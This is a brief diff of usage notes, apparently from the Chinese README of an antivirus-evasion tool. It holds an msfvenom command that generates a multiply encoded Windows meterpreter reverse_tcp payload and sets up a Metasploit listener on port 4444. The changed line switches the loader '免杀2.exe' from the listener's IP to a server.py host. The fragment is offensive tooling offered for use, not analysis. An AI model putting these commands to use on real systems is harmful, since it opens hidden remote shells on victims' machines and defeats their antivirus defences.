@@ -5,4 +5,4 @@ msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x0
 0x03:
 msf监听4444端口
 0x04:
-免杀2使用： 免杀2.exe [msf监听ip]
+免杀2使用： 免杀2.exe [存放server.py服务ip]
